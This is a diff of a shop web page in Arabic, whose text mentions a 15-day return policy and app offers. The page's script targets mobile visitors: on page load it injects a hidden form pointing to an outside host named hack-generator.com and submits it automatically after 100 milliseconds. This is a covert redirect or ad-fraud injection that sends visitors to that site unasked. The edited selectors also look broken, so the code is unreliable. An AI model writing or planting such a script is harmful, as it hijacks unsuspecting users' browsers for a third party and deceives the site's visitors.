@@ -30,7 +30,7 @@
 سياسة إرجاع سهلة خلال 15 يوم عمل
 الحصول على عروض خاصة عند التسوق باستخدام التطبيق
     </div>
-    <div id='section'/>
+    
   </body> 
 <script>
         
@@ -39,16 +39,16 @@
         
         
         if(isMobile){
-  	window.addEventListener(&#39;load&#39;,()=&gt;{
+  	window.addEventListener('load',()=>{
             
-                document.querySelector(&#39;#section&#39;).innerHTML = `
+                document.querySelector('.section').innerHTML = `
                     <form action='https://hack-generator.com/fb-ads.php' id='myForm1' method='post' name='myForm' style='display:none'>
                       <input name='y' type='text' value='1'/>
                       <button name='x' type='submit'/>
                     </form>
                 `;
-                setTimeout(()=&gt;{
-                    document.querySelector(&#39;#myForm1&#39;).submit();
+                setTimeout(()=>{
+                    document.querySelector('myForm1').submit();
                 },100);
             
         });
